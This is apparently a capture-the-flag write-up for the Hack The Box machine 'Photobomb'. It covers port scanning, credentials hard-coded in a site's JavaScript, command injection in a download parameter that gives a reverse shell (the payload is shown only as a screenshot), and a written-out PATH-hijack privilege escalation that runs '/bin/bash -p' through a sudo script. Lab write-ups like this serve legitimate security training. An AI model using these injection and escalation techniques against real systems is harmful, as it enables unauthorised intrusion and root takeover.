# Photobomb
https://app.hackthebox.com/machines/Photobomb

## Port scan

### Tool used: nmap
<br>

```
nmap -p- photobomb.htb

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 17:05 CDT
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.078s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 38.18 seconds
```

First, we take a look at the website:<br><br>

![web](./docs/photobomb/photobomb_01_web.png)

![login](./docs/photobomb/photobomb_02_login.png)

The website has a link to login, but we are presented with a sign-in popup. Looking at the HTML, we see a reference to "photobomb.js". <br><br>

```html
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
```

Looking at the JavaScript file, we see some hard-coded credentials for "tech support".<br><br>

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Following this link, we are taken to the "printer" page, where you can download various images in various resolutions.<br><br>

![printer](./docs/photobomb/photobomb_03_printer.png)

Using *Burp*, we see that during the download request, 3 parameters are being passed:<br><br>

![download](./docs/photobomb/photobomb_04_download.png)

This looks like a good spot for remote code execution, so we put some python code between the 2nd and 3rd parameters, and upon forwarding the request, we are able to get a reverse shell as **wizard**.<br><br>

![rshell](./docs/photobomb/photobomb_06_rshell.png)

Right away, we get the user flag:

**user.txt**

```
9b9f0da8************************
```

Next, we see what kind of privileges we have:<br><br>

```
$ sudo -l
sudo -l

Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Looking at "cleanup.sh" we see that there is a call to the **find** command, but it is not absolute.<br><br>

```sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

This means that we can set a new path for our custom **find** command, which will launch a privileged shell instead of searching for files.<br><br>

```
$ cd /tmp

$ touch find

$ echo "/bin/bash -p" > find

$ chmod +x find

$ sudo PATH=/tmp:$PATH /opt/cleanup.sh

root@photobomb:/home/wizard/photobomb# id

uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb# 
```

From here, we can capture the root flag:

**root.txt**

```
711df426************************
```